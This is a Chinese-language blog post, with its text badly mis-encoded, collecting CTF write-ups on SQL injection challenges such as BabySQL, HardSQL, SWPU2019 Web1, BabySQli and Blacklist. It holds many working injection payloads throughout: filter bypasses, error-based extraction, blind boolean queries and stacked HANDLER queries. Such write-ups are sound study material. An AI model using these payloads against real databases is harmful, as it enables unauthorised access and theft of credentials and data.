href="https://blog.csdn.net/weixin_44300286/article/details/96597167?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">SQLæ³¨å…¥ä¸€äº›è¿‡æ»¤åŠç»•è¿‡æ€»ç»“_obsetearçš„åšå®¢-CSDNåšå®¢</a></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p>çœ‹åˆ°ç•Œé¢æç¤ºå­˜åœ¨è¿‡æ»¤</p><p>è¾“å…¥1&#39; and 1=1# 1â€˜ or 1#  1&#39; and select 1 from 1#ç­‰è¯­å¥æ ¹æ®è¿”å›çš„é”™è¯¯ä¿¡æ¯å¯ä»¥çŸ¥é“è¿‡æ»¤äº†select or and union from by where</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619173714989.png" alt="image-20210619173714989"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619173908385.png" alt="image-20210619173908385"></p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨åŒå†™ç»•è¿‡ï¼Œé¦–å…ˆåˆ©ç”¨order byæŸ¥å­—æ®µæ•°å¯ä»¥æŸ¥åˆ°è¡¨å†…æœ‰ä¸‰åˆ—</p><p>1&#39; oorrder bbyy 4;#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619174055661.png" alt="image-20210619174055661"></p><p>æ¥ä¸‹æ¥å¯ä»¥åˆ©ç”¨è”åˆæŸ¥è¯¢</p><p>å…ˆçœ‹å›æ˜¾1&#39; ununionion selselectect 1,2,3;#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619174226243.png" alt="image-20210619174226243"></p><p>æŸ¥åº“å1&#39; ununionion selselectect 1,2,database();#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619174351658.png" alt="image-20210619174351658"></p><p>æŸ¥è¡¨å</p><p>1&#39; ununionion selselectect 1,2,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database());#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619174759820.png" alt="image-20210619174759820"></p><p>flagåº”è¯¥åœ¨b4bsqlè¡¨é‡Œï¼Œçˆ†ä¸€ä¸‹åˆ—å</p><p>1&#39; ununionion selselectect 1,2,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;);#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619175029086.png" alt="image-20210619175029086"></p><p>æœ€åçˆ†å†…å®¹1&#39; ununionion selselectect 1,2,(selselectect group_concat(id,username,passwoorrd) frfromom b4bsql);#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619175306597.png" alt="image-20210619175306597"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p>è¯•äº†ä¸€ä¸‹ï¼Œand union ç©ºæ ¼ ç­‰äºéƒ½è¢«è¿‡æ»¤äº†å°è¯•äº†å‡ ç§ç»•è¿‡å§¿åŠ¿éƒ½æ²¡æˆåŠŸï¼Œçœ‹äº†ä¸‹åˆ«äººçš„wpè¯´æ˜¯æŠ¥é”™æ³¨å…¥</p><p>åˆ©ç”¨æ‹¬å·æ¥å»æ‰æŸ¥è¯¢è¯­å¥ä¸­çš„ç©ºæ ¼</p><p>å…ˆæŸ¥åº“</p><p>0&#39;or(extractvalue(1,concat(0x7e,(database()),0x7e)))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619181915074.png" alt="image-20210619181915074"></p><p>å†æŸ¥è¡¨</p><p>ç”±äºç­‰äºå·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦ç”¨like</p><p>admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e)))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619184507074.png" alt="image-20210619184507074"></p><p>çˆ†åˆ—å</p><p>admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e)))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619184801079.png" alt="image-20210619184801079"></p><p>æœ€åçˆ†å†…å®¹</p><p>admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e)))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619185705420.png" alt="image-20210619185705420"></p><p>flag{66f2f5cd-207d-4d50-87</p><p>ç”±äºextractvalueæ˜¾ç¤ºå­—ç¬¦æ•°çš„é™åˆ¶ï¼Œè¦ç”¨substrå‡½æ•°å¯¹å…¶è¿›è¡Œåˆ†å‰²</p><p>admin&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(id,username,password))from(H4rDsq1)),31),0x7e)))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619190153350.png" alt="image-20210619190153350"></p><p>cd-207d-4d50-87bd-d8b762ffce95}</p><p>æœ€åæ‹¼ä¸€ä¸‹å¾—åˆ°flag</p><p>flag{66f2f5cd-207d-4d50-87bd-d8b762ffce95}</p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>è¿›å…¥åæ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œæ³¨å†Œä¸ªè´¦å·ä¹‹åç™»å½•</p><p>å¯ä»¥çŸ¥é“æ³¨å…¥ç‚¹åœ¨å¹¿å‘Šä½ä¸Š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619214559474.png" alt="image-20210619214559474"></p><p>è¯•ä¸€ä¸‹å¯ä»¥çŸ¥é“or and #éƒ½è¢«è¿‡æ»¤äº†</p><p>å› ä¸ºè¿‡æ»¤äº†ï¼ƒå·ï¼Œæ‰€ä»¥è¦ä¿è¯åé¢çš„å•å¼•å·èƒ½é—­åˆ</p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;â€˜1â€™&#x3D;â€˜1</code></pre><p>å¾—åˆ°å›æ˜¾ä½ç½®2ï¼Œ3.</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619220207345.png" alt="image-20210619220207345"></p><p><strong>å› ä¸ºorè¢«è¿‡æ»¤ï¼Œä¸”æ— æ³•é€šè¿‡å¤§å°å†™å’ŒåŒå†™ç»•è¿‡ï¼Œé‚£ä¹ˆinformation_schemaå› ä¸ºå«æœ‰orï¼Œæ‰€ä»¥ä¹Ÿæ²¡æ³•ä½¿ç”¨ã€‚</strong>è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡</p><p><a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">SQLæ³¨å…¥ï¼šé™åˆ¶æ¡ä»¶ä¸‹è·å–è¡¨åã€æ— åˆ—åæ³¨å…¥ - MustaphaMond - åšå®¢å›­ (cnblogs.com)</a></p><p>InnoDbå¼•æ“<br>ä»MYSQL5.5.8å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨MYSQL5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œinndbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚<br>sysæ•°æ®åº“<br>åœ¨5.7ä»¥ä¸Šçš„MYSQLä¸­ï¼Œæ–°å¢äº†sysæ•°æ®åº“ï¼Œè¯¥åº“çš„åŸºç¡€æ•°æ®æ¥è‡ªinformation_schemaå’Œperformance_chemaï¼Œå…¶æœ¬èº«ä¸å­˜å‚¨æ•°æ®ã€‚å¯ä»¥é€šè¿‡å…¶ä¸­çš„schema_auto_increment_columnsæ¥è·å–è¡¨åã€‚</p><p>sysæ•°æ®åº“éœ€è¦rootæƒé™ï¼Œè€ŒinnoDbåœ¨mysqlä¸­é»˜è®¤å…³é—­</p><p>é™åˆ¶ï¼š<br><strong>mysql â‰¥ 5.7ç‰ˆæœ¬</strong></p><p>å…ˆæŸ¥ä¸€ä¸‹æ•°æ®åº“ç‰ˆæœ¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619221524942.png" alt="image-20210619221524942"></p><p>å› æ­¤å¯ä»¥åˆ©ç”¨innoDbæ¥æŸ¥è¡¨å</p><p>ç³»ç»ŸMysqlåº“ä¸­å­˜åœ¨ä¸¤å¼ ä¸innodbç›¸å…³çš„è¡¨ï¼š<code>innodb_table_stats</code>å’Œ<code>innodb_index_stats</code>ã€‚</p><p>æ‰€ä»¥å¯ä»¥é€šè¿‡æŸ¥æ‰¾è¿™ä¸¤ä¸ªè¡¨å–ä»£informationçš„ä½œç”¨</p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1</code></pre><p>æˆ–</p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_index_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1</code></pre><p>å¾—åˆ°è¡¨åä¸ºadså’Œusers</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619223630074.png" alt="image-20210619223630074"></p><p>çŒœflagåœ¨usersè¡¨å†…ï¼Œè¿›è¡Œæ— åˆ—åæ³¨å…¥</p><p><strong>æ— åˆ—åæ³¨å…¥åŸç†</strong></p><p>æ— åˆ—åæ³¨å…¥çš„åŸç†å°±æ˜¯åœ¨å–åˆ«åçš„åŒæ—¶æŸ¥è¯¢æ•°æ®ã€‚é€šè¿‡æ— åˆ—åæŸ¥è¯¢æ„é€ ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œåœ¨æ„é€ æ­¤è¡¨çš„åŒæ—¶æŸ¥è¯¢å…¶ä¸­çš„æ•°æ®ã€‚</p><p>è¡¨çš„åˆ—æ•°ä¹Ÿè¦ä¸€æ¬¡æ¬¡è¯•</p><p>ï¼ˆä¸å¤ªæ‡‚ä¸ºå•¥è¿™é‡Œçš„åˆ—æ•°ä¸æ˜¯22)</p><p><a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysqlä¹‹æ— åˆ—åæ³¨å…¥ - çŸ¥ä¹ (zhihu.com)</a></p><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">SWPU2019]Web1 - ç‹å¹ä¹‹ - åšå®¢å›­ (cnblogs.com)</a></p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,(select&#x2F;**&#x2F;group_concat(&#96;3&#96;)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#39;1&#39;&#x3D;&#39;1</code></pre><p>å¦‚æœåå¼•å·è¢«è¿‡æ»¤ï¼Œå°±è¦å¯¹å­—æ®µåˆ©ç”¨åˆ«åæ›¿ä»£</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210619234252501.png" alt="image-20210619234252501"></p><p><strong>è¿˜å¯ä»¥åˆ©ç”¨joinçˆ†åˆ—å</strong></p><p>joinåçš„åˆ—åæ˜¯ä¸¤ä¸ªè¡¨åˆ—ååŠ èµ·æ¥çš„ï¼Œå¯èƒ½ä¼šäº§â½£ç›¸åŒçš„åˆ—åï¼Œå¦‚idå’Œnameï¼Œä½¿â½¤åˆ«åæ—¶ï¼Œè¡¨ä¸­ä¸èƒ½å‡ºç°åŒçš„å­—æ®µåï¼Œè¿™å°±è·Ÿjoinç¬¬â¼€ä¸ªç‰¹ç‚¹ç›¸å†²çªï¼Œæ‰€ä»¥åœ¨joinå’Œåˆ«ååŒæ—¶ä½¿â½¤æ—¶ä¼šå¯¼è‡´æŠ¥é”™</p><p>å½“é€šè¿‡æŸ¥è¯¢å¾—åˆ°æ–°çš„è¡¨æ—¶ï¼Œå¿…é¡»æœ‰ä¸€ä¸ªåˆ«åï¼Œå³æ¯ä¸ªæ´¾ç”Ÿå‡ºæ¥çš„è¡¨éƒ½å¿…é¡»æœ‰ä¸€ä¸ªè‡ªå·±çš„åˆ«å</p><h2 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h2><p><strong>åŸç†</strong></p><p>äºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚</p><p><strong>äºŒæ¬¡æ³¨å…¥ï¼Œå¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸¤æ­¥:</strong></p><ul><li>ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„æ•°æ®<br> è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚</li><li>ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ®<br> å¼€å‘è€…é»˜è®¤å­˜å…¥æ•°æ®åº“çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ã€‚</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210621110912304.png" alt="image-20210621110912304"></p><h2 id="è®°è€ƒæ ¸èµ›çš„ä¸€æ¬¡sqlç›²æ³¨"><a href="#è®°è€ƒæ ¸èµ›çš„ä¸€æ¬¡sqlç›²æ³¨" class="headerlink" title="è®°è€ƒæ ¸èµ›çš„ä¸€æ¬¡sqlç›²æ³¨"></a>è®°è€ƒæ ¸èµ›çš„ä¸€æ¬¡sqlç›²æ³¨</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210821170913431.png" alt="image-20210821170913431"></p><p>(strcmp(ascii(substr(REVERSE(tceles)(table_name)from(mysql.innodb_table_stats)where((table_schema)like(database())),1,1)),10000))%23</p><p>||strcmp(ascii(substr((select(table_name)from(mysql.innodb_table_stats))where((database_name)like(database())),1,1)),1)%23</p><p>username=admin&amp;password=||((ascii(mid((pwd)from(1))))like(12))%23</p><p>YouAresOgOoD</p><p>select(table_name)from(information_schema.tables)where(table_schema=database())</p><p>||(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),Â§1Â§,1))=Â§0Â§)%23</p><p>flag_1s_her3</p><p>||(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f31735f68657233)),Â§1Â§,1))=Â§0Â§)%23</p><p>flag{sql1_1s_s0_ea3y}</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>sqlæ³¨å…¥ï¼Œå…ˆç”¨fuzzæµ‹ä¸€ä¸‹è¿‡æ»¤ï¼ˆbuuçš„ç½‘ç«™å¥½åƒæœ‰è®¿é—®é™åˆ¶ï¼Œæ‰€ä»¥poståˆ°åé¢ä¹‹åå› ä¸ºè¯·æ±‚å¤ªå¤šäº†ä¼šç›´æ¥æŠ¥429ï¼Œè€Œä¸”ä¸çŸ¥é“æ˜¯ä¸æ˜¯bpçš„é—®é¢˜æœ‰äº›æ²¡æœ‰è¿‡æ»¤çš„ä¹Ÿä¼šè¢«æ˜¾ç¤ºä¸ºè¢«è¿‡æ»¤äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724095707401.png" alt="image-20210724095707401"></p><p>è¿™é‡Œåº”è¯¥è¦é‡‡ç”¨boolç›²æ³¨çš„æ–¹å¼ï¼Œä½†æ˜¯è¿‡æ»¤çš„ä¸œè¥¿æœ‰ç‚¹å¤š</p><p>å› ä¸ºç©ºæ ¼è¢«è¿‡æ»¤äº†æ‰€ä»¥è¦åˆ©ç”¨ï¼ˆï¼‰æ¥ä»£æ›¿ç©ºæ ¼</p><p>æŠ„äº†ä¸ªè„šæœ¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724131620633.png" alt="image-20210724131620633"></p><p>æ„Ÿè§‰æ˜¯å¾ˆç®€å•çš„ç›²æ³¨ï¼Œç„¶åè¦åˆ©ç”¨pythonç¼–è„šæœ¬</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p> <a href="https://blog.csdn.net/qq_45521281/article/details/107167452">GXYCTF2019]BabySQliâ€”â€”â€œç»•è¿‡md5æ¯”è¾ƒâ€_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢</a></p><p>å½“ç”¨æˆ·åä¸ºadminæ—¶ï¼Œæç¤ºå¯†ç é”™è¯¯ï¼Œå› æ­¤èƒ½çŸ¥é“ç”¨æˆ·åä¸ºadmin</p><p>ç™»å½•åè·³è½¬åˆ°search.phpä¸­ï¼Œåœ¨æºç é‡Œå­˜åœ¨ä¸€ä¸ªè¿›è¡ŒbaseåŠ å¯†çš„æç¤º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724153525231.png" alt="image-20210724153525231"></p><p>sqlæ³¨å…¥ï¼Œå…ˆfuzzçœ‹ä¸€ä¸‹è¿‡æ»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724152502898.png" alt="image-20210724152502898"></p><p>ç„¶åå¯ä»¥åˆ©ç”¨å¤§å†™ç»•è¿‡æŸ¥åˆ°å…±æœ‰3åˆ—ï¼ˆå…¶å®ç›´æ¥unionè¯•ä¹Ÿå¯ä»¥</p><p>ä¹‹åè¦åˆ©ç”¨è”åˆæ³¨å…¥</p><p><strong>åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ã€‚</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724152803276.png" alt="image-20210724152803276"></p><p>åç«¯ä»£ç </p><pre class="language-none"><code class="language-none">&lt;?php$row;$pass&#x3D;$_POST[&#39;pw&#39;];if($row[&#39;username&#39;]&#x3D;&#x3D;â€™adminâ€™)&#123;if($row[&#39;password&#39;]&#x3D;&#x3D;md5($pass))&#123; echo $flag; &#125;else&#123; echo â€œwrong pass!â€; &#125;&#125;else&#123; echo â€œwrong user!â€;&#125;</code></pre><p>æ‰€ä»¥å¯ä»¥åœ¨è”åˆæŸ¥è¯¢æ—¶æ„é€ è™šæ‹Ÿçš„æ•°æ®åˆ©ç”¨è¿™ä¸ªæ•°æ®è¿›è¡Œç™»å½•æ“ä½œ</p><pre class="language-none"><code class="language-none">username&#x3D;0&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; #password&#x3D;123</code></pre><p>å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724153406008.png" alt="image-20210724153406008"></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>è¿™ä¸ªçœ‹èµ·æ¥å’Œå¼ºç½‘æ¯é‚£ä¸ªæœ‰ç‚¹åƒ</p><p>åŒæ ·ä¹Ÿæ˜¯å †å æ³¨å…¥</p><p>å¯ä»¥ç”¨</p><p>1&#39;;show tables;#æŸ¥è¡¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210725230626425.png" alt="image-20210725230626425"></p><p>flagåº”è¯¥å°±åœ¨flaghereè¿™ä¸ªè¡¨é‡Œ</p><p>çœ‹ä¸€ä¸‹åˆ—å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210725231110024.png" alt="image-20210725231110024"></p><p>æƒ³æŸ¥çœ‹çš„æ—¶å€™å‘ç°å­˜åœ¨è¿‡æ»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210725231208544.png" alt="image-20210725231208544"></p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨headler</p><p>HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p><p>æœ€ç»ˆpayloadï¼š1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p><p>1&#39;;handler score open;handler score read first;handler score close;#</p><p>ï¼ˆè¯•äº†ä¸€ä¸‹åˆ©ç”¨headlerå¼ºç½‘æ¯çš„é‚£é“ä¹Ÿèƒ½æ³¨å‡ºæ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210725231720309.png" alt="image-20210725231720309"></p><p><strong>å…³äºhandlerå‘½ä»¤</strong><br>è½¬è½½è‡ª:<a href="https://blog.csdn.net/jesseyoung/article/details/40785137">https://blog.csdn.net/jesseyoung/article/details/40785137</a></p><p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚<br>HANDLERè¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äºMyISAMå’ŒInnoDBè¡¨ã€‚</p><p>åŸºæœ¬è¯­æ³•ï¼š</p><pre class="language-none"><code class="language-none">HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE</code></pre><p>é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtbl_nameçš„å¥æŸ„ã€‚<br>é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚<br>é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚</p><p>é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚<br>é€šè¿‡HANDLER tbl_name READ index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼ŒNEXTè·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚</p><p>é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ã€‚<br>é€šè¿‡HANDLER tbl_name READ index_name = 